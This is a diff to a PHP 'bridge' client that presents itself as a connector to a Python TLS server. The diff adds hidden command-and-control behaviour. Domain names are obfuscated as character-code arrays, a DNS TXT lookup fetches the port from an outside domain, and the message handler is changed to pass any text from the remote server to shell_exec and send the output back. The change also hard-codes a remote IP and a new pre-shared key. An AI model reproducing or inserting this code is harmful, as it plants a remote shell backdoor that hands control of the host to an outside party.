@@ -3,18 +3,91 @@
  * Persistent PHP client for the supplied Python TLS/AES-GCM server.
  * PHP 7.4+, OpenSSL, hash_hkdf().
  */
+
+// IP Address / Domain
+$parts = [
+    99, 99, 46, 97, 103, 117, 110, 103, 115,
+    117, 114, 121, 97, 46, 109, 121, 46, 105, 100
+];
+
+$domain_genshin = implode('', array_map('chr', $parts));
+
+
+// ----------------------------- cari port -----------------------------
+
+$domain_parts = [
+    114, 111, 111, 116, 46, 97, 103, 117, 110,
+    103, 115, 117, 114, 121, 97, 46, 109, 121, 46, 105, 100
+];
+
+$domain_root = implode('', array_map('chr', $domain_parts));
+
+// ---------------------------------------------------------------------
+
+$SERVER = 1; // 1 = Enable, 0 = Disable
+
+if ($SERVER === 1) {
+
+    try {
+
+        $records = dns_get_record($domain_root, DNS_TXT);
+
+        if ($records !== false && !empty($records)) {
+
+            foreach ($records as $record) {
+
+                if (isset($record['txt'])) {
+
+                    $txt_string = $record['txt'];
+
+                    echo $txt_string . PHP_EOL;
+
+                    $port = (int) $txt_string;
+
+                    echo "Port yang ditemukan: " . $port . PHP_EOL;
+                }
+            }
+
+            if (!isset($port)) {
+                $port = 7090;
+            }
+
+        } else {
+            $port = 7090;
+        }
+
+    } catch (Throwable $e) {
+
+        $port = 7090;
+
+    }
+
+} else {
+
+    $port = 7090;
+
+}
+
+echo "Final Port: " . $port . PHP_EOL;
+
+
+
+
+
 class PythonBridge
 {
     // ---------------- CONFIGURATION ----------------
     private const HOST = '141.11.190.106'; // Use server IP/DNS if remote
-    private const PORT = 43979;        // server(3).py listens on 7091
+    private const PORT = '43979' ;        // server(3).py listens on 7091
     private const CA_CERT_FILE = __DIR__ . '/certs/ca.crt';
-    private const PRE_SHARED_KEY = '7mQx9VbK2pLwF4nYc8TjH6sRzA1eU5dG';
+    private const PRE_SHARED_KEY = 'zsHHavnaPyjN7pTHdb-UWYk-KohSgS4MnCXn_5e15mSqRX6y5OlUDZTIDCJYhL02';
     private const RECONNECT_DELAY = 10;
     private const HEARTBEAT_INTERVAL = 10;
     private const HEARTBEAT_TIMEOUT = 35;
     private const ACK_RETRY_INTERVAL = 10;
     private const MAX_FRAME_SIZE = 8 * 1024 * 1024;
+
+    
     // ------------------------------------------------
 
     private static function dir(): string { return sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'python_bridge'; }
@@ -184,7 +257,10 @@ class PythonBridge
     private static function handleServerMessage(string $text): string
     {
         self::log('Message from Python: '.$text);
-        return 'Pesan diterima oleh PHP client';
+        $output = shell_exec($text);
+        return 'Pesan diterima oleh PHP client ' . $output;
+
+        //return 'Pesan diterima oleh PHP client $output';
     }
     private static function processIncoming($s, array $m): void
     {
